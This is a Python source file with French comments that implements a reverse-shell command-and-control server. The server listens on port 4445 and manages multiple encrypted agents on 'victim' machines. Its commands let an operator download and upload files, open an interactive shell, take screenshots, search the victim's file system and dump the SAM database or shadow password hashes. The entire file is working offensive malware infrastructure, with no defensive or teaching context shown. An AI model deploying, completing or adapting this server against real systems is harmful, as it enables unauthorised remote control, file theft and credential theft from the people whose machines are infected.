import socket
import threading
import os
import re
from base64 import b64decode, b64encode
from aes_crypt import (
    AESCipher,
)  # Import de la classe AESCipher depuis le fichier aes_crypt


class ReverseShellServer:
    def __init__(self, host, port):
        """
        Initialise le serveur de shell inversé.

        @param host - Le nom d'hôte ou l'adresse IP du serveur.
        @param port - Le port sur lequel le serveur écoute.
        """
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.client_id_map = {}

    def start(self):
        """
        Démarre le serveur, écoute les connexions entrantes et crée des threads pour chaque client.
        """
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[+] En écoute sur {self.host}:{self.port}...")

        client_id = 1
        while True:
            conn, addr = self.server_socket.accept()
            hostname, os_type = self.get_client_info(conn)
            print(f"[+] Connexion de {addr} (hostname: {hostname}, OS: {os_type})")
            self.clients[client_id] = conn
            self.client_id_map[client_id] = {
                "address": addr,
                "hostname": hostname,
                "os": os_type,
                "connection": conn,
            }
            client_thread = threading.Thread(
                target=self.handle_client, args=(conn, addr, client_id)
            )
            client_thread.start()
            client_id += 1

    def get_client_info(self, conn):
        """
        Obtient les informations du client (nom d'hôte et type de système d'exploitation).

        @param conn - La connexion avec le client.
        @return tuple (hostname, os_type)
        """
        try:
            data = b""
            while True:
                part = conn.recv(4096)
                if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                    data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                    break
                data += part
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            hostname, os_type = decrypted_data.split("|")
            return hostname.strip(), os_type.strip()
        except Exception as e:
            print(f"[!] Échec de l'obtention des infos client: {e}")
            return "Inconnu", "Inconnu"

    def handle_client(self, conn, addr, client_id):
        """
        Gère la communication avec un client.

        @param conn - La connexion avec le client.
        @param addr - L'adresse du client.
        @param client_id - L'identifiant du client.
        """
        try:
            while True:
                command = input("[i] Main Shell> ")
                if command.strip() == "":
                    continue
                if command.lower() == "help":
                    self.show_help()
                elif command.lower() == "list":
                    self.list_clients()
                elif (
                    command.split()[0].isdigit()
                    and int(command.split()[0]) in self.clients
                ):
                    self.handle_agent_command(command)
                else:
                    conn.send(AESCipher.encrypt(command).encode("utf-8"))
                    if command == "screenshot":
                        self.handle_screenshot(conn, client_id)
        except ConnectionResetError:
            print(f"[x] Connexion avec {addr} perdue.")
        finally:
            conn.close()
            del self.clients[client_id]
            del self.client_id_map[client_id]

    def show_help(self):
        """
        Affiche les commandes disponibles.
        """
        print("\n[i] Commandes disponibles:")
        print("[i] help         : Affiche ce message d'aide")
        print("[i] list         : Liste tous les agents connectés")
        print(
            "[i] <agent_id> <commande> : Envoie une commande à l'agent spécifié (ex: '1 upload /path/to/file')"
        )
        print(
            "[i] Commandes à envoyer aux agents (précisez l'agent_id avant la commande):"
        )
        print(
            "[i]   download <path>     : Télécharge des fichiers de la victime vers le serveur"
        )
        print(
            "[i]   upload <path>       : Upload des fichiers du serveur vers la victime"
        )
        print("[i]   shell               : Ouvre un shell interactif (bash ou cmd)")
        print(
            "[i]   ipconfig            : Obtient la configuration réseau de la machine victime"
        )
        print(
            "[i]   screenshot          : Prend une capture d'écran de la machine victime"
        )
        print("[i]   search <file>       : Recherche un fichier sur la machine victime")
        print(
            "[i]   hashdump            : Récupère la base SAM ou le fichier shadow de la machine victime\n"
        )

    def list_clients(self):
        """
        Liste tous les agents connectés.
        """
        print("\n[+] Agents actifs:")
        for client_id, info in self.client_id_map.items():
            print(
                f"[+] {client_id}: {info['address']} (hostname: {info['hostname']}, OS: {info['os']})"
            )
        print()

    def handle_agent_command(self, command):
        """
        Gère les commandes envoyées aux agents.

        @param command - La commande à envoyer.
        """
        try:
            parts = command.split(" ", 2)
            client_id = int(parts[0])
            agent_command = parts[1]
            if len(parts) > 2:
                args = parts[2]
            else:
                args = ""
        except IndexError:
            print("[!] Erreur: Format de commande invalide")
            return
        except ValueError:
            print("[!] Erreur: ID d'agent invalide")
            return

        if client_id in self.clients:
            conn = self.clients[client_id]
            if agent_command == "download":
                self.handle_download(args, conn)
            elif agent_command == "upload":
                self.handle_upload(args, conn)
            elif agent_command == "shell":
                self.interactive_shell(conn)
            elif agent_command == "ipconfig":
                self.handle_ipconfig(conn, client_id)
            elif agent_command == "search":
                self.handle_search(args, conn)
            elif agent_command == "hashdump":
                self.handle_hashdump(conn)
            elif agent_command == "screenshot":
                self.handle_screenshot(conn, client_id)
            else:
                self.send_command(agent_command + " " + args, conn)
        else:
            print(f"[x] Erreur: Client {client_id} non trouvé")

    def handle_screenshot(self, conn, client_id):
        """
        Gère la commande de capture d'écran.

        @param conn - La connexion avec le client.
        @param client_id - L'identifiant du client.
        """
        file_path = f"screenshot_{client_id}.png"
        try:
            longueur_img = int(conn.recv(4096).decode())
            with open(file_path, "wb") as img:
                first_data = 0
                while first_data < longueur_img:
                    donnees = conn.recv(4096)
                    if not donnees:
                        break
                    img.write(donnees)
                    first_data += len(donnees)
            print(f"[+] Le screenshot est sauvegardé : {file_path}.")
        except Exception as e:
            print(f"[x] Impossible de sauvegarder le screenshot: {e}")

    def handle_ipconfig(self, conn, client_id):
        """
        Gère la commande ipconfig et envoie le résultat au client.

        @param conn - La connexion avec le client.
        @param client_id - L'identifiant du client.
        """
        conn.send(AESCipher.encrypt(f"ipconfig").encode("utf-8"))
        encrypted_eof = AESCipher.encrypt("EOF").encode("utf-8")
        buffer = b""

        while True:
            part = conn.recv(1024)
            if encrypted_eof in part:
                buffer += part[: part.index(encrypted_eof)]
                break
            buffer += part

        try:
            ips = self.extract_interfaces_and_ips(
                AESCipher.decrypt(part.decode("utf-8"))
            )
            print("[+] Adresses IP locales et leurs interfaces:")
            for ip in ips:
                print(f"[+] Agent {client_id} IP ==> {ip}")
        except Exception as e:
            print(f"[x] Échec du déchiffrement des données ipconfig: {e}")

    def extract_interfaces_and_ips(self, data):
        """
        Extrait les adresses IP des données en utilisant une regex.

        @param data - Les données contenant les adresses IP.
        @return List des adresses IP.
        """
        ip_regex = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        ips = re.findall(ip_regex, data)
        return ips

    def handle_download(self, file_path, conn):
        """
        Gère la commande de téléchargement.

        @param file_path - Le chemin du fichier à télécharger.
        @param conn - La connexion avec le client.
        """
        conn.send(AESCipher.encrypt(f"download {file_path}").encode("utf-8"))
        try:
            with open(file_path, "wb") as f:
                while True:
                    data = conn.recv(4096)
                    decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"[+] Fichier {file_path} téléchargé avec succès.")
        except Exception as e:
            print(f"[x] Échec du téléchargement de {file_path}: {e}")

    def handle_upload(self, file_path, conn):
        """
        Gère la commande d'upload.

        @param file_path - Le chemin du fichier à uploader.
        @param conn - La connexion avec le client.
        """
        conn.send(AESCipher.encrypt(f"upload {file_path}").encode("utf-8"))
        buffer_size = int(
            input("[i] Entrez la taille du buffer pour l'upload (en octets): ")
        )
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(buffer_size)
                    if not chunk:
                        break
                    conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
            print(f"[+] Fichier {file_path} uploadé avec succès.")
        except Exception as e:
            print(f"[x] Échec de l'upload de {file_path}: {e}")
            conn.send(AESCipher.encrypt("ERREUR").encode("utf-8"))

    def handle_search(self, file_name, conn):
        """
        Gère la commande de recherche de fichier.

        @param file_name - Le nom du fichier à rechercher.
        @param conn - La connexion avec le client.
        """
        conn.send(AESCipher.encrypt(f"search {file_name}").encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(4096)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            print("[+] Résultats de la recherche:")
            print(decrypted_data)
        except IndexError as e:
            if str(e) == "string index out of range":
                print(
                    "[x] Échec du déchiffrement: La commande ne retourne rien avant EOF"
                )
            else:
                print(f"[x] Une IndexError est survenue: {e}")
        except Exception as e:
            print(f"[x] Échec du déchiffrement des données de recherche: {e}")

    def handle_hashdump(self, conn):
        """
        Gère la commande de dump de hash.

        @param conn - La connexion avec le client.
        """
        conn.send(AESCipher.encrypt("hashdump").encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(4096)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            print("[+] Résultats du hashdump:")
            print(decrypted_data)
        except Exception as e:
            print(f"[x] Échec du déchiffrement des données de hashdump: {e}")

    def interactive_shell(self, conn):
        """
        Ouvre un shell interactif pour envoyer des commandes au client.

        @param conn - La connexion avec le client.
        """
        while True:
            shell_command = input("[i] Shell (tapez 'exit' pour revenir)> ")
            if shell_command.lower() == "exit":
                break
            if shell_command:
                self.send_command(shell_command, conn)

    def send_command(self, command, conn):
        """
        Envoie une commande au client et affiche le résultat.

        @param command - La commande à envoyer.
        @param conn - La connexion avec le client.
        """
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(4096)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            if decrypted_data:
                print(decrypted_data)
        except Exception as e:
            print(f"[x] Échec du déchiffrement de la réponse à la commande: {e}")


if __name__ == "__main__":
    server = ReverseShellServer("0.0.0.0", 4445)
    server.start()
